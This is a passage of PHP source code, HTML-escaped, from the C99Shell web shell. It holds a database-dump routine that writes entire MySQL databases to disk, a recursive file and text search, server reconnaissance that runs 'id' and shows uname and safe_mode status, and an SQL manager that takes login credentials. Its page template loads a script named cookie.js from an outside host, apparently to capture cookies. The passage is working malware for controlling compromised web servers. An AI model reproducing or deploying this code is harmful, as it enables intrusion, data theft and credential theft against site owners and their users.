$set[&quot;tabs&quot;];\\r\\n $onlytabs = $set[&quot;onlytabs&quot;];\\r\\n $ret = array();\\r\\n $ret[&quot;err&quot;] = array();\\r\\n if (!is_resource($sock)) {echo(&quot;Error: \\\\$sock is not valid resource.&quot;);}\\r\\n if (empty($db)) {$db = &quot;db&quot;;}\\r\\n if (empty($print)) {$print = 0;}\\r\\n if (empty($nl2br)) {$nl2br = 0;}\\r\\n if (empty($add_drop)) {$add_drop = true;}\\r\\n if (empty($file))\\r\\n {\\r\\n  global $win;\\r\\n  if ($win) {$file = &quot;C:\\\\\\\\tmp\\\\\\\\dump_&quot;.$SERVER_NAME.&quot;_&quot;.$db.&quot;_&quot;.date(&quot;d-m-Y-H-i-s&quot;).&quot;.sql&quot;;}\\r\\n  else {$file = &quot;\\/tmp\\/dump_&quot;.$SERVER_NAME.&quot;_&quot;.$db.&quot;_&quot;.date(&quot;d-m-Y-H-i-s&quot;).&quot;.sql&quot;;}\\r\\n }\\r\\n if (!is_array($tabs)) {$tabs = array();}\\r\\n if (empty($add_drop)) {$add_drop = true;}\\r\\n if (sizeof($tabs) == 0)\\r\\n {\\r\\n  \\/\\/ retrive tables-list\\r\\n  $res = mysql_query(&quot;SHOW TABLES FROM &quot;.$db, $sock);\\r\\n  if (mysql_num_rows($res) &gt; 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}\\r\\n }\\r\\n $SERVER_ADDR = getenv(&quot;SERVER_ADDR&quot;);\\r\\n $SERVER_NAME = getenv(&quot;SERVER_NAME&quot;);\\r\\n $out = &quot;# Dumped by C99Shell.SQL v. &quot;.$shver.&quot;\\r\\n# Home page: http:\\/\\/ccteam.ru\\r\\n#\\r\\n# Host settings:\\r\\n# MySQL version: (&quot;.mysql_get_server_info().&quot;) running on &quot;.$SERVER_ADDR.&quot; (&quot;.$SERVER_NAME.&quot;)&quot;.&quot;\\r\\n# Date: &quot;.date(&quot;d.m.Y H:i:s&quot;).&quot;\\r\\n# &quot;.gethostbyname($SERVER_ADDR).&quot; (&quot;.$SERVER_ADDR.&quot;)&quot;.&quot; dump db \\\\&quot;&quot;.$db.&quot;\\\\&quot;\\r\\n#---------------------------------------------------------\\r\\n&quot;;\\r\\n $c = count($onlytabs);\\r\\n foreach($tabs as $tab)\\r\\n {\\r\\n  if ((in_array($tab,$onlytabs)) or (!$c))\\r\\n  {\\r\\n   if ($add_drop) {$out .= &quot;DROP TABLE IF EXISTS `&quot;.$tab.&quot;`;\\\\n&quot;;}\\r\\n   \\/\\/ recieve query for create table structure\\r\\n   $res = mysql_query(&quot;SHOW CREATE TABLE `&quot;.$tab.&quot;`&quot;, $sock);\\r\\n   if (!$res) {$ret[&quot;err&quot;][] = mysql_smarterror();}\\r\\n   else\\r\\n   {\\r\\n    $row = mysql_fetch_row($res);\\r\\n    $out .= $row[&quot;1&quot;].&quot;;\\\\n\\\\n&quot;;\\r\\n    \\/\\/ recieve table variables\\r\\n    $res = mysql_query(&quot;SELECT * FROM `$tab`&quot;, $sock);\\r\\n    if (mysql_num_rows($res) &gt; 0)\\r\\n    {\\r\\n     while ($row = mysql_fetch_assoc($res))\\r\\n     {\\r\\n      $keys = implode(&quot;`, `&quot;, array_keys($row));\\r\\n      $values = array_values($row);\\r\\n      foreach($values as $k=&gt;$v) {$values[$k] = addslashes($v);} \\r\\n      $values = implode(&quot;\', \'&quot;, $values); \\r\\n      $sql = &quot;INSERT INTO `$tab`(`&quot;.$keys.&quot;`) VALUES (\'&quot;.$values.&quot;\');\\\\n&quot;; \\r\\n      $out .= $sql;\\r\\n     } \\r\\n    }\\r\\n   }\\r\\n  }\\r\\n }\\r\\n $out .= &quot;#---------------------------------------------------------------------------------\\\\n\\\\n&quot;;\\r\\n if ($file)\\r\\n {\\r\\n  $fp = fopen($file, &quot;w&quot;); \\r\\n  if (!$fp) {$ret[&quot;err&quot;][] = 2;}\\r\\n  else\\r\\n  {\\r\\n   fwrite ($fp, $out);\\r\\n   fclose ($fp);\\r\\n  }\\r\\n }\\r\\n if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}\\r\\n return $out;\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;mysql_buildwhere&quot;))\\r\\n{\\r\\nfunction mysql_buildwhere($array,$sep=&quot; and&quot;,$functs=array())\\r\\n{\\r\\n if (!is_array($array)) {$array = array();}\\r\\n $result = &quot;&quot;;\\r\\n foreach($array as $k=&gt;$v)\\r\\n {\\r\\n  $value = &quot;&quot;;\\r\\n  if (!empty($functs[$k])) {$value .= $functs[$k].&quot;(&quot;;}\\r\\n  $value .= &quot;\'&quot;.addslashes($v).&quot;\'&quot;;\\r\\n  if (!empty($functs[$k])) {$value .= &quot;)&quot;;}\\r\\n  $result .= &quot;`&quot;.$k.&quot;` = &quot;.$value.$sep;\\r\\n }\\r\\n $result = substr($result,0,strlen($result)-strlen($sep));\\r\\n return $result;\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;mysql_fetch_all&quot;))\\r\\n{\\r\\nfunction mysql_fetch_all($query,$sock)\\r\\n{\\r\\n if ($sock) {$result = mysql_query($query,$sock);}\\r\\n else {$result = mysql_query($query);}\\r\\n $array = array();\\r\\n while ($row = mysql_fetch_array($result)) {$array[] = $row;}\\r\\n mysql_free_result($result);\\r\\n return $array;\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;mysql_smarterror&quot;))\\r\\n{\\r\\nfunction mysql_smarterror($type,$sock)\\r\\n{\\r\\n if ($sock) {$error = mysql_error($sock);}\\r\\n else {$error = mysql_error();}\\r\\n $error = htmlspecialchars($error);\\r\\n return $error;\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;mysql_query_form&quot;))\\r\\n{\\r\\nfunction mysql_query_form()\\r\\n{\\r\\n global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;\\r\\n if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = &quot;Query was empty&quot;;} echo &quot;&lt;b&gt;Error:&lt;\\/b&gt; &lt;br&gt;&quot;.$sql_query_error.&quot;&lt;br&gt;&quot;;}\\r\\n if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}\\r\\n if ((!$submit) or ($sql_act))\\r\\n {\\r\\n  echo &quot;&lt;table border=0&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=\\\\&quot;&quot;.$sql_surl.&quot;\\\\&quot; name=\\\\&quot;c99sh_sqlquery\\\\&quot; method=\\\\&quot;POST\\\\&quot;&gt;&lt;b&gt;&quot;; if (($sql_query) and (!$submit)) {echo &quot;Do you really want to&quot;;} else {echo &quot;SQL-Query&quot;;} echo &quot;:&lt;\\/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\\\\&quot;sql_query\\\\&quot; cols=\\\\&quot;100\\\\&quot; rows=\\\\&quot;10\\\\&quot;&gt;&quot;.htmlspecialchars($sql_query).&quot;&lt;\\/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;sql_act\\\\&quot; value=\\\\&quot;query\\\\&quot;&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;sql_tbl\\\\&quot; value=\\\\&quot;&quot;.htmlspecialchars($sql_tbl).&quot;\\\\&quot;&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;submit\\\\&quot; value=\\\\&quot;1\\\\&quot;&gt;&lt;input type=\\\\&quot;hidden\\\\&quot; name=\\\\&quot;sql_goto\\\\&quot; value=\\\\&quot;&quot;.htmlspecialchars($sql_goto).&quot;\\\\&quot;&gt;&lt;input type=\\\\&quot;submit\\\\&quot; name=\\\\&quot;sql_confirm\\\\&quot; value=\\\\&quot;Yes\\\\&quot;&gt;&amp;nbsp;&lt;input type=\\\\&quot;submit\\\\&quot; value=\\\\&quot;No\\\\&quot;&gt;&lt;\\/form&gt;&lt;\\/td&gt;&quot;;\\r\\n  if ($tbl_struct)\\r\\n  {\\r\\n   echo &quot;&lt;td valign=\\\\&quot;top\\\\&quot;&gt;&lt;b&gt;Fields:&lt;\\/b&gt;&lt;br&gt;&quot;;\\r\\n   foreach ($tbl_struct as $field) {$name = $field[&quot;Field&quot;]; echo &quot;&raquo; &lt;a href=\\\\&quot;#\\\\&quot; onclick=\\\\&quot;document.c99sh_sqlquery.sql_query.value+=\'`&quot;.$name.&quot;`\';\\\\&quot;&gt;&lt;b&gt;&quot;.$name.&quot;&lt;\\/b&gt;&lt;\\/a&gt;&lt;br&gt;&quot;;}\\r\\n   echo &quot;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;\\/table&gt;&quot;;\\r\\n  }\\r\\n }\\r\\n if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;mysql_create_db&quot;))\\r\\n{\\r\\nfunction mysql_create_db($db,$sock=&quot;&quot;)\\r\\n{\\r\\n $sql = &quot;CREATE DATABASE `&quot;.addslashes($db).&quot;`;&quot;;\\r\\n if ($sock) {return mysql_query($sql,$sock);}\\r\\n else {return mysql_query($sql);}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;mysql_query_parse&quot;))\\r\\n{\\r\\nfunction mysql_query_parse($query)\\r\\n{\\r\\n $query = trim($query);\\r\\n $arr = explode (&quot; &quot;,$query);\\r\\n \\/*array array()\\r\\n {\\r\\n  &quot;METHOD&quot;=&gt;array(output_type),\\r\\n  &quot;METHOD1&quot;...\\r\\n  ...\\r\\n }\\r\\n if output_type == 0, no output,\\r\\n if output_type == 1, no output if no error\\r\\n if output_type == 2, output without control-buttons\\r\\n if output_type == 3, output with control-buttons\\r\\n *\\/\\r\\n $types = array(\\r\\n  &quot;SELECT&quot;=&gt;array(3,1),\\r\\n  &quot;SHOW&quot;=&gt;array(2,1),\\r\\n  &quot;DELETE&quot;=&gt;array(1),\\r\\n  &quot;DROP&quot;=&gt;array(1)\\r\\n );\\r\\n $result = array();\\r\\n $op = strtoupper($arr[0]);\\r\\n if (is_array($types[$op]))\\r\\n {\\r\\n  $result[&quot;propertions&quot;] = $types[$op];\\r\\n  $result[&quot;query&quot;]  = $query;\\r\\n  if ($types[$op] == 2)\\r\\n  {\\r\\n   foreach($arr as $k=&gt;$v)\\r\\n   {\\r\\n    if (strtoupper($v) == &quot;LIMIT&quot;)\\r\\n    {\\r\\n     $result[&quot;limit&quot;] = $arr[$k+1];\\r\\n     $result[&quot;limit&quot;] = explode(&quot;,&quot;,$result[&quot;limit&quot;]);\\r\\n     if (count($result[&quot;limit&quot;]) == 1) {$result[&quot;limit&quot;] = array(0,$result[&quot;limit&quot;][0]);}\\r\\n     unset($arr[$k],$arr[$k+1]);\\r\\n    }\\r\\n   }\\r\\n  }\\r\\n }\\r\\n else {return false;}\\r\\n}\\r\\n}\\r\\nif (!function_exists(&quot;c99fsearch&quot;))\\r\\n{\\r\\nfunction c99fsearch($d)\\r\\n{\\r\\n global $found;\\r\\n global $found_d;\\r\\n global $found_f;\\r\\n global $search_i_f;\\r\\n global $search_i_d;\\r\\n global $a;\\r\\n if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\\r\\n $h = opendir($d);\\r\\n while (($f = readdir($h)) !== false)\\r\\n {\\r\\n  if($f != &quot;.&quot; &amp;&amp; $f != &quot;..&quot;)\\r\\n  {\\r\\n   $bool = (empty($a[&quot;name_regexp&quot;]) and strpos($f,$a[&quot;name&quot;]) !== false) || ($a[&quot;name_regexp&quot;] and ereg($a[&quot;name&quot;],$f));\\r\\n   if (is_dir($d.$f))\\r\\n   {\\r\\n    $search_i_d++;\\r\\n    if (empty($a[&quot;text&quot;]) and $bool) {$found[] = $d.$f; $found_d++;}\\r\\n    if (!is_link($d.$f)) {c99fsearch($d.$f);}\\r\\n   }\\r\\n   else\\r\\n   {\\r\\n    $search_i_f++;\\r\\n    if ($bool)\\r\\n    {\\r\\n     if (!empty($a[&quot;text&quot;]))\\r\\n     {\\r\\n      $r = @file_get_contents($d.$f);\\r\\n      if ($a[&quot;text_wwo&quot;]) {$a[&quot;text&quot;] = &quot; &quot;.trim($a[&quot;text&quot;]).&quot; &quot;;}\\r\\n      if (!$a[&quot;text_cs&quot;]) {$a[&quot;text&quot;] = strtolower($a[&quot;text&quot;]); $r = strtolower($r);}\\r\\n      if ($a[&quot;text_regexp&quot;]) {$bool = ereg($a[&quot;text&quot;],$r);}\\r\\n      else {$bool = strpos(&quot; &quot;.$r,$a[&quot;text&quot;],1);}\\r\\n      if ($a[&quot;text_not&quot;]) {$bool = !$bool;}\\r\\n      if ($bool) {$found[] = $d.$f; $found_f++;}\\r\\n     }\\r\\n     else {$found[] = $d.$f; $found_f++;}\\r\\n    }\\r\\n   }\\r\\n  }\\r\\n }\\r\\n closedir($h);\\r\\n}\\r\\n}\\r\\nif ($act == &quot;gofile&quot;) {if (is_dir($f)) {$act = &quot;ls&quot;; $d = $f;} else {$act = &quot;f&quot;; $d = dirname($f); $f = basename($f);}}\\r\\n\\/\\/Sending headers\\r\\nheader(&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;);\\r\\nheader(&quot;Last-Modified: &quot;.gmdate(&quot;D, d M Y H:i:s&quot;).&quot; GMT&quot;);\\r\\nheader(&quot;Cache-Control: no-store, no-cache, must-revalidate&quot;);\\r\\nheader(&quot;Cache-Control: post-check=0, pre-check=0&quot;, false);\\r\\nheader(&quot;Pragma: no-cache&quot;);\\r\\nif (empty($tmpdir))\\r\\n{\\r\\n if (!$win) {$tmpdir = &quot;\\/tmp\\/&quot;;}\\r\\n else {$tmpdir = getenv(&quot;SystemRoot&quot;);}\\r\\n}\\r\\nelse {$tmpdir = realpath($tmpdir);}\\r\\n$tmpdir = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$tmpdir);\\r\\nif (substr($tmpdir,-1,1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}\\r\\nif (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}\\r\\nelse {$tmpdir_logs = realpath($tmpdir_logs);}\\r\\nif (@ini_get(&quot;safe_mode&quot;) or strtolower(@ini_get(&quot;safe_mode&quot;)) == &quot;on&quot;)\\r\\n{\\r\\n $safemode = true;\\r\\n $hsafemode = &quot;&lt;font color=\\\\&quot;red\\\\&quot;&gt;ON (secure)&lt;\\/font&gt;&quot;;\\r\\n}\\r\\nelse {$safemode = false; $hsafemode = &quot;&lt;font color=\\\\&quot;green\\\\&quot;&gt;OFF (not secure)&lt;\\/font&gt;&quot;;}\\r\\n$v = @ini_get(&quot;open_basedir&quot;);\\r\\nif ($v or strtolower($v) == &quot;on&quot;) {$openbasedir = true; $hopenbasedir = &quot;&lt;font color=\\\\&quot;red\\\\&quot;&gt;&quot;.$v.&quot;&lt;\\/font&gt;&quot;;}\\r\\nelse {$openbasedir = false; $hopenbasedir = &quot;&lt;font color=\\\\&quot;green\\\\&quot;&gt;OFF (not secure)&lt;\\/font&gt;&quot;;}\\r\\n$sort = htmlspecialchars($sort);\\r\\nif (empty($sort)) {$sort = $sort_default;}\\r\\n$sort[1] = strtolower($sort[1]);\\r\\n$DISP_SERVER_SOFTWARE = getenv(&quot;SERVER_SOFTWARE&quot;);\\r\\nif (!ereg(&quot;PHP\\/&quot;.phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= &quot;. PHP\\/&quot;.phpversion();}\\r\\n$DISP_SERVER_SOFTWARE = str_replace(&quot;PHP\\/&quot;.phpversion(),&quot;&lt;a href=\\\\&quot;&quot;.$surl.&quot;act=phpinfo\\\\&quot; target=\\\\&quot;_blank\\\\&quot;&gt;&lt;b&gt;&lt;u&gt;PHP\\/&quot;.phpversion().&quot;&lt;\\/u&gt;&lt;\\/b&gt;&lt;\\/a&gt;&quot;,htmlspecialchars($DISP_SERVER_SOFTWARE));\\r\\n@ini_set(&quot;highlight.bg&quot;,$highlight_bg); \\/\\/FFFFFF\\t\\r\\n@ini_set(&quot;highlight.comment&quot;,$highlight_comment); \\/\\/#FF8000\\t\\r\\n@ini_set(&quot;highlight.default&quot;,$highlight_default); \\/\\/#0000BB\\t\\r\\n@ini_set(&quot;highlight.html&quot;,$highlight_html); \\/\\/#000000\\t\\r\\n@ini_set(&quot;highlight.keyword&quot;,$highlight_keyword); \\/\\/#007700\\t\\r\\n@ini_set(&quot;highlight.string&quot;,$highlight_string); \\/\\/#DD0000\\r\\nif (!is_array($actbox)) {$actbox = array();}\\r\\n$dspact = $act = htmlspecialchars($act);\\r\\n$disp_fullpath = $ls_arr = $notls = null;\\r\\n$ud = urlencode($d);\\r\\n?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text\\/html; charset=windows-1251&quot;&gt;&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;en-us&quot;&gt;&lt;link rel=&quot;shortcut icon&quot; href=&quot;&quot; type=&quot;image\\/x-icon&quot;&gt;&lt;title&gt;&lt;?php echo getenv(&quot;HTTP_HOST&quot;); ?&gt; c99txt.org- c99shell&lt;\\/title&gt;&lt;STYLE&gt;TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}&lt;\\/style&gt;&lt;\\/head&gt;&lt;BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;&lt;center&gt;&lt;SCRIPT SRC=http:\\/\\/www.c99txt.net\\/siyir\\/cookie.js&gt;&lt;\\/SCRIPT&gt;&lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=&quot;#C0C0C0&quot;&gt;&lt;tr&gt;&lt;th width=&quot;101%&quot; height=&quot;15&quot; nowrap bordercolor=&quot;#C0C0C0&quot; valign=&quot;top&quot; colspan=&quot;2&quot;&gt;&lt;p&gt;&lt;font face=Webdings size=6&gt;&lt;b&gt;!&lt;\\/b&gt;&lt;\\/font&gt;&lt;a href=&quot;&lt;?php echo $surl; ?&gt;&quot;&gt;&lt;font face=&quot;Verdana&quot; size=&quot;5&quot;&gt;&lt;b&gt;C99Shell v. &lt;?php echo $shver; ?&gt;&lt;\\/b&gt;&lt;\\/font&gt;&lt;\\/a&gt;&lt;font face=Webdings size=6&gt;&lt;b&gt;!&lt;\\/b&gt;&lt;\\/font&gt;&lt;\\/p&gt;&lt;\\/center&gt;&lt;\\/th&gt;&lt;\\/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p align=&quot;left&quot;&gt;&lt;b&gt;Software:&amp;nbsp;&lt;?php echo $DISP_SERVER_SOFTWARE; ?&gt;&lt;\\/b&gt;&amp;nbsp;&lt;\\/p&gt;&lt;p align=&quot;left&quot;&gt;&lt;b&gt;uname -a:&amp;nbsp;&lt;?php echo wordwrap(php_uname(),90,&quot;&lt;br&gt;&quot;,1); ?&gt;&lt;\\/b&gt;&amp;nbsp;&lt;\\/p&gt;&lt;p align=&quot;left&quot;&gt;&lt;b&gt;&lt;?php if (!$win) {echo wordwrap(myshellexec(&quot;id&quot;),90,&quot;&lt;br&gt;&quot;,1);} else {echo get_current_user();} ?&gt;&lt;\\/b&gt;&amp;nbsp;&lt;\\/p&gt;&lt;p align=&quot;left&quot;&gt;&lt;b&gt;Safe-mode:&amp;nbsp;&lt;?php echo $hsafemode; ?&gt;&lt;\\/b&gt;&lt;\\/p&gt;&lt;p align=&quot;left&quot;&gt;&lt;?php\\r\\n$d = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$d);\\r\\nif (empty($d)) {$d = realpath(&quot;.&quot;);} elseif(realpath($d)) {$d = realpath($d);}\\r\\n$d = str_replace(&quot;\\\\\\\\&quot;,DIRECTORY_SEPARATOR,$d);\\r\\nif (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\\r\\n$d = str_replace(&quot;\\\\\\\\\\\\\\\\&quot;,&quot;\\\\\\\\&quot;,$d);\\r\\n$dispd = htmlspecialchars($d);\\r\\n$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,strlen($d)-1));\\r\\n$i = 0;\\r\\nforeach($pd as $b)\\r\\n{\\r\\n $t = &quot;&quot;;\\r\\n reset($e);\\r\\n $j = 0;\\r\\n foreach ($e as $r)\\r\\n {\\r\\n  $t.= $r.DIRECTORY_SEPARATOR;\\r\\n  if ($j == $i) {break;}\\r\\n  $j++;\\r\\n }\\r\\n echo &quot;&lt;a href=\\\\&quot;&quot;.$surl.&quot;act=ls&amp;d=&quot;.urlencode($t).&quot;&amp;sort=&quot;.$sort.&quot;\\\\&quot;&gt;&lt;b&gt;&quot;.htmlspecialchars($b).DIRECTORY_SEPARATOR.&quot;&lt;\\/b&gt;&lt;\\/a&gt;&quot;;\\r\\n $i++;\\r\\n}\\r\\necho &quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;;\\r\\nif (is_writable($d))\\r\\n{\\r\\n $wd = true;\\r\\n $wdt = &quot;&lt;font color=\\\\&quot;green\\\\&quot;&gt;[ ok ]&lt;\\/font&gt;&quot;;\\r\\n echo &quot;&lt;b&gt;&lt;font color=\\\\&quot;green\\\\&quot;&gt;&quot;.view_perms(fileperms($d)).&quot;&lt;\\/font&gt;&lt;\\/b&gt;&quot;;\\r\\n}\\r\\nelse\\r\\n{\\r\\n $wd = false;\\r\\n $wdt = &quot;&lt;font color=\\\\&quot;red\\\\&quot;&gt;[ Read-Only ]&lt;\\/font&gt;&quot;;\\r\\n echo &quot;&lt;b&gt;&quot;.view_perms_color($d).&quot;&lt;\\/b&gt;&quot;;\\r\\n}\\r\\nif (is_callable(&quot;disk_free_space&quot;))\\r\\n{\\r\\n $free = disk_free_space($d);\\r\\n $total = disk_total_space($d);\\r\\n if ($free === false) {$free = 0;}\\r\\n if ($total === false) {$total = 0;}\\r\\n if ($free &lt; 0) {$free = 0;}\\r\\n if ($total &lt; 0) {$total = 0;}\\r\\n $used = $total-$free;\\r\\n $free_percent = round(100\\/($total\\/$free),2);\\r\\n echo &quot;&lt;br&gt;&lt;b&gt;Free &quot;.view_size($free).&quot; of &quot;.view_size($total).&quot; (&quot;.$free_percent.&quot;%)&lt;\\/b&gt;&quot;;\\r\\n}\\r\\necho &quot;&lt;br&gt;&quot;;\\r\\n$letters = &quot;&quot;;\\r\\nif ($win)\\r\\n{\\r\\n $v = explode(&quot;\\\\\\\\&quot;,$d);\\r\\n $v = $v[0];\\r\\n foreach (range(&quot;a&quot;,&quot;z&quot;) as $letter)\\r\\n {\\r\\n  $bool = $isdiskette = in_array($letter,$safemode_diskettes);\\r\\n  if (!$bool) {$bool = is_dir($letter.&quot;:\\\\\\\\&quot;);}\\r\\n  if ($bool)\\r\\n  {\\r\\n   $letters .= &quot;&lt;a href=\\\\&quot;&quot;.$surl.&quot;act=ls&amp;d=&quot;.$letter.&quot;:\\\\\\\\\\\\&quot;&quot;.($isdiskette?&quot; onclick=\\\\&quot;return confirm(\'Make sure that the diskette is inserted properly, otherwise an error may occur.\')\\\\&quot;&quot;:&quot;&quot;).&quot;&gt;[ &quot;;\\r\\n   if ($letter.&quot;:&quot; != $v) {$letters .= $letter;}\\r\\n   else {$letters .= &quot;&lt;font color=\\\\&quot;green\\\\&quot;&gt;&quot;.$letter.&quot;&lt;\\/font&gt;&quot;;}\\r\\n   $letters .= &quot; ]&lt;\\/a&gt; &quot;;\\r\\n  }\\r\\n }\\r\\n if (!empty($letters)) {echo &quot;&lt;b&gt;Detected drives&lt;\\/b&gt;: &quot;.$letters.&quot;&lt;br&gt;&quot;;}\\r\\n}\\r\\nif (count($quicklaunch) &gt; 0)\\r\\n{\\r\\n foreach($quicklaunch as $item)\\r\\n {\\r\\n  $item[1] = str_replace(&quot;%d&quot;,urlencode($d),$item[1]);\\r\\n  $item[1] = str_replace(&quot;%sort&quot;,$sort,$item[1]);\\r\\n  $v = realpath($d.&quot;..&quot;);\\r\\n  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}\\r\\n  $item[1] = str_replace(&quot;%upd&quot;,urlencode($v),$item[1]);\\r\\n  echo &quot;&lt;a href=\\\\&quot;&quot;.$item[1].&quot;\\\\&quot;&gt;&quot;.$item[0].&quot;&lt;\\/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;;\\r\\n }\\r\\n}\\r\\n?&gt;&lt;\\/p&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;\\/table&gt;&lt;br&gt;&lt;?php\\r\\nif ((!empty($donated_html)) and (in_array($act,$donated_act))) {?&gt;&lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width=&quot;100%&quot; valign=&quot;top&quot;&gt;&lt;?php echo $donated_html; ?&gt;&lt;\\/td&gt;&lt;\\/tr&gt;&lt;\\/table&gt;&lt;br&gt;&lt;?php }\\r\\n?&gt;&lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width=&quot;100%&quot; valign=&quot;top&quot;&gt;&lt;?php\\r\\nif ($act == &quot;&quot;) {$act = $dspact = &quot;ls&quot;;}\\r\\nif ($act == &quot;sql&quot;)\\r\\n{\\r\\n $sql_surl = $surl.&quot;act=sql&quot;;\\r\\n if ($sql_login)  {$sql_surl .= &quot;&amp;sql_login=&quot;.htmlspecialchars($sql_login);}\\r\\n if ($sql_passwd) {$sql_surl .= &quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd);}\\r\\n if ($sql_server) {$sql_surl .= &quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server);}\\r\\n if ($sql_port)   {$sql_surl .= &quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port);}\\r\\n if ($sql_db)     {$sql_surl .= &quot;&amp;sql_db=&quot;.htmlspecialchars($sql_db);}\\r\\n $sql_surl .= &quot;&amp;&quot;;\\r\\n ?&gt;&lt;h3&gt;Attention! SQL-Manager is &lt;u&gt;NOT&lt;\\/u&gt; ready module! Don\'t reports bugs.&lt;\\/h3&gt;&lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=&quot;#C0C0C0&quot;&gt;&lt;tr&gt;&lt;td width=&quot;100%&quot; height=&quot;1&quot; colspan=&quot;2&quot; valign=&quot;top&quot;&gt;&lt;center&gt;&lt;?php\\r\\n if ($sql_server)\\r\\n {\\r\\n  $sql_sock = mysql_connect($sql_server.&quot;:&quot;.$sql_port, $sql_login, $sql_passwd);\\r\\n  $err = mysql_smarterror();\\r\\n  @mysql_select_db($sql_db,$sql_sock);\\r\\n  if ($sql_query and $submit) {$sql_query_result = 